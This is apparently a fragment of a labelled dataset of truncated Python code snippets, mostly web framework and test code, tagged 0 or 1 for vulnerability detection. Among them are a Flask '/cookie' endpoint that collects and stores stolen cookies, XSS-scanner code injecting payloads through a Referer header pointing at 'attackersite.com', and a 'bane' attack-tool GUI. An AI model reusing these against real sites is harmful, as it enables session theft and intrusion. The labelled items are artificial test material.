-%(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter', 'format", "label": 0}, {"snippet_id": 35914, "code": "\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value", "label": 0}, {"snippet_id": 36472, "code": " self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters", "label": 0}, {"snippet_id": 31112, "code": " scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \t \tfunct.ssh_command(master,", "label": 0}, {"snippet_id": 37687, "code": " t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from", "label": 0}, {"snippet_id": 19641, "code": " suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir", "label": 0}, {"snippet_id": 23879, "code": ".assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self)", "label": 0}, {"snippet_id": 11417, "code": " def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str", "label": 0}, {"snippet_id": 39543, "code": "(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\",", "label": 0}, {"snippet_id": 22337, "code": "'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns ", "label": 0}, {"snippet_id": 12972, "code": "'ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 2501, "code": ",scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body", "label": 0}, {"snippet_id": 52436, "code": "().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node'", "label": 0}, {"snippet_id": 38399, "code": "(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str", "label": 0}, {"snippet_id": 7824, "code": "]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses", "label": 0}, {"snippet_id": 10609, "code": " import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"", "label": 0}, {"snippet_id": 46041, "code": "(): collection_doc.can_read_or_exception(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document=collection_doc) except Exception,", "label": 0}, {"snippet_id": 32175, "code": "'Rules')) class Meta(object): name=\"idp_mappings\" verbose_name=_(\"Attribute Mappings\") row_actions=(EditMappingLink, DeleteMappingsAction) table_actions=(MappingFilterAction, CreateMappingLink, DeleteMappingsAction", "label": 0}, {"snippet_id": 11264, "code": " against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else", "label": 0}, {"snippet_id": 6249, "code": ", 'logfile') if not res: res=None return res @property def syslog_socket(self): \"\"\" Syslog socket to log to(string). Something like '/dev/log' maybe. \"\"\" res=self.config.get(self.section, 'syslog_socket", "label": 0}, {"snippet_id": 11970, "code": ".course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 48180, "code": "[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user, headline, category, text, file) except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return", "label": 0}, {"snippet_id": 6414, "code": "\"\" SSL certificate filename(None==SSL disabled) \"\"\" return self.config.get(self.section, 'server_cert') @property def server_key(self): \"\"\" SSL private key filename(None==SSL disabled) \"\"\" return self.config", "label": 0}, {"snippet_id": 49583, "code": ": self.object_list=object_list self.model=object_list.model self.query_params=query_params or{} self.list_display=list_display or[] self.list_filter=list_filter or[] self.list_search=list_search or[] self", "label": 0}, {"snippet_id": 42563, "code": "]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t", "label": 0}, {"snippet_id": 36147, "code": "[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t", "label": 0}, {"snippet_id": 10371, "code": "(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string", "label": 0}, {"snippet_id": 25876, "code": " field=forms.TimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None, widget=TimePickerWidget", "label": 0}, {"snippet_id": 17631, "code": "), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views", "label": 0}, {"snippet_id": 45452, "code": "(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission", "label": 0}, {"snippet_id": 48379, "code": ".objects.get(id=int(request.GET[\"group_id\"])) for art in Article.objects.all().filter(group=g): if str(\"quantity_\" +str(art.id)) not in request.POST or str(\"notes_\" +str(art.id)) not in request.POST: return", "label": 0}, {"snippet_id": 20261, "code": " 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except", "label": 0}, {"snippet_id": 8189, "code": ", url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login", "label": 0}, {"snippet_id": 29266, "code": " e: \t\terror=e \t\tpass \t\t \treturn error \t def upload_and_restart(serv, cfg, **kwargs): \timport sql \ttmp_file=sql.get_setting('tmp_config_path') +\"/\" +get_data('config') +\".cfg\" \terror=\"\" \t \ttry: \t\tos.system", "label": 0}, {"snippet_id": 8999, "code": "/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name", "label": 0}, {"snippet_id": 2386, "code": ") def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method==", "label": 0}, {"snippet_id": 25004, "code": "=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params", "label": 0}, {"snippet_id": 45851, "code": " i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir", "label": 0}, {"snippet_id": 52820, "code": "=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow", "label": 0}, {"snippet_id": 48324, "code": "=Already%20submitted\") if \"article_id\" in request.POST: aid: int=int(request.GET.get(\"article_id\")) quantity: int=int(request.POST[\"quantity\"]) notes: str=request.POST[\"notes\"] ar=ArticleRequested() ar", "label": 1}, {"snippet_id": 24200, "code": "'') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz", "label": 0}, {"snippet_id": 35031, "code": ".db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise", "label": 0}, {"snippet_id": 41920, "code": "[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child", "label": 0}, {"snippet_id": 42578, "code": "\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"", "label": 0}, {"snippet_id": 1388, "code": " data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers", "label": 0}, {"snippet_id": 1484, "code": " scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static", "label": 1}, {"snippet_id": 45894, "code": ".html import escape from django.utils.translation import ugettext as _ from django.core.urlresolvers import reverse from desktop.conf import USE_NEW_EDITOR from desktop.lib.django_util import JsonResponse", "label": 0}, {"snippet_id": 6235, "code": " @property def logfile(self): \"\"\" Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe. \"\"\" res=self.config.get(self.section, 'logfile') if not res: res=None return res @property", "label": 0}, {"snippet_id": 7407, "code": ">[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED", "label": 0}, {"snippet_id": 36180, "code": "[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):", "label": 0}, {"snippet_id": 8681, "code": "]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 22233, "code": "'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views", "label": 0}, {"snippet_id": 20550, "code": ") @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 25486, "code": ", **kwargs ) self.require_all_fields=require_all_fields self.required=self.one_required def clean(self, value) -> dict: value=super().clean(value) if self.one_required and(not value or not any(v for v in", "label": 0}, {"snippet_id": 18095, "code": ">[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 23230, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$", "label": 0}, {"snippet_id": 9384, "code": ">[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$", "label": 0}, {"snippet_id": 17959, "code": ".generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue", "label": 0}, {"snippet_id": 3929, "code": " referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers)", "label": 1}, {"snippet_id": 912, "code": " if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url", "label": 0}, {"snippet_id": 41650, "code": "\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t", "label": 0}, {"snippet_id": 9491, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 29368, "code": "\" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror", "label": 0}, {"snippet_id": 476, "code": "-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert", "label": 1}, {"snippet_id": 17562, "code": " import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES", "label": 0}, {"snippet_id": 7674, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook", "label": 1}, {"snippet_id": 50023, "code": ".DOTALL +re.MULTILINE) _SERVERNAME=settings.SERVERNAME _KEEPALIVE=30 class LazyEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj, Promise): return force_unicode(obj) return super(LazyEncoder", "label": 0}, {"snippet_id": 21819, "code": " urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),", "label": 0}, {"snippet_id": 19018, "code": " +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=", "label": 0}, {"snippet_id": 41186, "code": "\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title", "label": 1}, {"snippet_id": 48152, "code": "(file.name) +\"' and cropped it. The resulting PK is \" +str(m.pk)) def action_add_single_media(request: HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"] text=request", "label": 0}, {"snippet_id": 10003, "code": " BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns", "label": 1}, {"snippet_id": 4079, "code": ") result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[", "label": 0}, {"snippet_id": 50096, "code": " for checking the connection is still alive. \"\"\" now=time.time() to_remove=[] keep_alives=((csessid, remove) for csessid,(t, remove) in self.last_alive.iteritems() if now -t > _KEEPALIVE) for csessid, remove", "label": 0}, {"snippet_id": 35166, "code": "' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif", "label": 0}, {"snippet_id": 23539, "code": "'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'),", "label": 0}, {"snippet_id": 38634, "code": "\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing", "label": 0}, {"snippet_id": 35613, "code": "\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of", "label": 0}, {"snippet_id": 54269, "code": " x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0,'http://') global cookie cookie=Entry(main) global method method=ttk.Combobox(main, values=", "label": 0}, {"snippet_id": 7345, "code": " if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings", "label": 0}, {"snippet_id": 37970, "code": ".blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} ", "label": 0}, {"snippet_id": 39637, "code": "=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in", "label": 0}, {"snippet_id": 37081, "code": ".full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t", "label": 0}, {"snippet_id": 2406, "code": " logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def", "label": 0}, {"snippet_id": 27255, "code": " len(sys.argv) !=2: print \"program[url]\" exit() url=sys.argv[1] if url.find(\"http\") !=0: print \"[-] Invalid target\" exit() m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M) if m: host=m.group(2)", "label": 1}, {"snippet_id": 49933, "code": "-this url is handled through django's template system and serves the html page for the client itself along with its javascript chat program. /webclientdata -this url is called by the ajax chat using POST", "label": 0}, {"snippet_id": 14285, "code": ": urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login", "label": 0}, {"snippet_id": 18289, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P", "label": 1}, {"snippet_id": 7241, "code": ", name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student", "label": 0}, {"snippet_id": 45022, "code": "=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) },", "label": 0}, {"snippet_id": 53856, "code": "): \treturn 'steal cookie:) ' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open", "label": 1}, {"snippet_id": 17785, "code": "'auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware", "label": 0}, {"snippet_id": 45709, "code": "\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if", "label": 0}, {"snippet_id": 13834, "code": "/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section", "label": 0}, {"snippet_id": 8212, "code": "'RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P", "label": 0}, {"snippet_id": 8307, "code": " if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 44445, "code": "'A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc", "label": 0}, {"snippet_id": 35202, "code": ".get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname", "label": 0}, {"snippet_id": 41268, "code": ", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context", "label": 0}, {"snippet_id": 40113, "code": " cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference", "label": 0}, {"snippet_id": 18694, "code": ".views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P", "label": 0}, {"snippet_id": 7289, "code": "', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon", "label": 0}, {"snippet_id": 44129, "code": ".mark.search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;", "label": 1}, {"snippet_id": 31485, "code": "(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('waf_metrics'): \tfrom", "label": 0}, {"snippet_id": 27578, "code": ".get('X-Appengine-Cron')) def render_forbidden(self, message): \"\"\"Write HTML response for 403.\"\"\" login_url=make_login_url(dest_url=self.request.url) user_email=helpers.get_user_email() if not user_email:", "label": 0}, {"snippet_id": 31764, "code": "/\"+form.getvalue('color')+\"/\"+list_name \ttry: \t\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as", "label": 0}, {"snippet_id": 2261, "code": "' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url", "label": 0}, {"snippet_id": 39794, "code": "=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues", "label": 0}, {"snippet_id": 24561, "code": "'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite,", "label": 0}, {"snippet_id": 48931, "code": ".field_name else None if type(self.object)==dict: value=self.object.get(self.column.field_name) elif callable(field): value=field() if getattr(field, 'do_not_call_in_templates', False) else field else:", "label": 1}, {"snippet_id": 22002, "code": "?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload')", "label": 0}, {"snippet_id": 3811, "code": " \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result", "label": 0}, {"snippet_id": 26341, "code": " self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country is currently not available. We will therefore ' 'need", "label": 0}, {"snippet_id": 34663, "code": ": \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif", "label": 0}, {"snippet_id": 24855, "code": " composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir ", "label": 0}, {"snippet_id": 52404, "code": ".filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc", "label": 0}, {"snippet_id": 9819, "code": "') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION", "label": 0}, {"snippet_id": 14380, "code": ".MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url", "label": 0}, {"snippet_id": 31428, "code": ".9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['curr_con'].max()) +150 \t\tp[serv].add_tools(hover) 